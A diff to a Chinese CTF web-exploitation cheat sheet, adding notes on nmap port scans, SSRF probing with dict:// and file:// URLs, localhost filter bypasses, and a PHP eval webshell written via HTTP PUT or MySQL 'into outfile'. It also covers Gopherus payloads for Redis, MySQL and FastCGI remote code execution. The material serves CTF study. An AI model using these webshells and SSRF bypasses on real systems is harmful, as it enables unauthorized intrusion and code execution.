@@ -228,8 +228,27 @@ find / -type f 2>/dev/null | grep -Ei 'f{1,5}l{1,5}a{1,5}g{1,5}'
 
 ## 端口扫描
 
+- PHP 中直接使用 `dict` 协议扫描端口，如 `?url=dict://127.0.0.1:80` ，如果响应 404，说明该端口开启，再访问 `?url=http://127.0.0.1` 即可【该方法可以利用 `127.0.0.1` 的权限扫描端口，因为端口未必是只对外界开放的，有的端口在 `127.0.0.1` 中】
+
 ### nmap
-> 端口扫描工具
+
+扫描几个端口
+
+```bash
+nmap -p 80,443 <target>
+```
+
+扫描一系列端口
+
+```bash
+nmap -p 1-1000 <target>
+```
+
+扫描所有端口
+
+```bash
+nmap -p- <target>
+```
 
 ## 文件
 - 看到 static 就联想到 Nginx 的目录穿越
@@ -733,10 +752,10 @@ SELECT * FROM users WHERE username='vampire     ';
 - 使用 include 包含文件时，如果不显示文件内容，记得使用伪协议。伪协议往往是 `php://` 开头，如果正则表达式只允许 `php` 开头，首先想到伪协议 
 - 看到 PHP 返回内容是 HTTP Headers，可以联想到 %00截断
 - 如果服务器开放了 HTTP PUT 方法，可以使用  `curl -X PUT -d '<?php eval(@$_POST['a']); ?>' http://x/b.php` 注入 `b.php` 文件（如果没有任何安全设置，**'PUT请求用于更新资源，如果资源不存在，可能会创建新的资源'** 这个原则会写入文件到服务端【真实场景几乎不会遇到此漏洞】）
-- 培养目录提权思维，如果一道题本身禁止访问 /flag.php，可以通过参数构造地址的方法 (类似 127.0.0.1/flag.php) 来访问。curl_setopt() 函数就类似 Python 的 requests，可以访问外部或内部地址
 - GET 方法传参的代码审计题，如果 `system('ls')` 注入不了[可能被过滤了，或者题目只给了只读权限，蚁剑的连接不一定只靠 `system`]，可以试试 `eval($_POST["a"]);`，**善用蚁剑来连接**
 - SSRF
-  - 常用套路 file:///etc/password ; file:///flag
+  - 常用套路 file:///etc/password; file:///var/www/html/index.php ; file:///flag
+  - 培养目录提权思维，如果一道题本身禁止访问 /flag.php，可以通过参数构造地址的方法 (类似 `http://127.0.0.1/flag.php`) 来访问。curl_setopt() 函数就类似 Python 的 requests，可以访问外部或内部地址（正则绕过：`localhost`、`0`、`127.0.0.x 、127.0.1、127.1`、`127.0.0。1`、`sudo.cc`）
   - 如果网站使用无密码 MySQL、Redis，可以考虑用 Gopherus 实现 RCE 注入
 
 
@@ -767,7 +786,7 @@ SELECT * FROM users WHERE username='vampire     ';
 
   写入文件的命令  `ls > 1.txt`  用  `ls | tee 1.txt`  替代。其中 `>` 是覆盖写入，`tee` 是追加写入
 
-- 如果 127.0.0.1 被过滤，可以使用 sudo.cc 替代。127.0.0.1 还可以写成 127.1    。http://0.0.0.0 可以写成 http://0
+- 如果 127.0.0.1 被过滤，可以使用 sudo.cc 替代。127.0.0.1 还可以写成 127.1    。http://0.0.0.0 可以写成 http://0 (上面 SSRF 的短总结写了所以过滤)
 
 #### 文件漏洞
 
@@ -1721,7 +1740,7 @@ gopherus --exploit mysql
 输入 execute 为
 
 ```sql
-select "<?php @eval($_POST['test']);?>" into outfile '/var/www/html/2.php';
+select "<?php @eval($_POST['a']);?>" into outfile '/var/www/html/2.php';
 ```
 
 得到
@@ -1747,7 +1766,7 @@ gopherus --exploit redis
 根据提示输入即可，和上面的打 MySQL 差不多，其中我选的 phpshell，没有选反弹 shell，只是 PHP 注入内容输入
 
 ```php
-<?php @eval($_POST['test']);?>
+<?php @eval($_POST['a']);?>
 ```
 
  然后通过默认生成的 shell.php 实现蚁剑连接
@@ -1776,7 +1795,7 @@ gopherus --exploit postgresql
 gopherus --exploit fastcgi
 ```
 
-   它只要求一个必须存在于受害者系统中的文件（最好是 .php 文件），顺便说一句，我们有默认文件。
+   它只要求一个必须存在于受害者系统中的文件（最好是 .php 文件），顺便说一句，我们有默认文件。然后是输入终端命令 (不是 PHP 的一句话木马，是 shell 命令)
 
 - Redis：如果redis端口是开放的，那么我们可以覆盖系统中的文件，这太危险了。
   所以这里有两件事你可以得到：
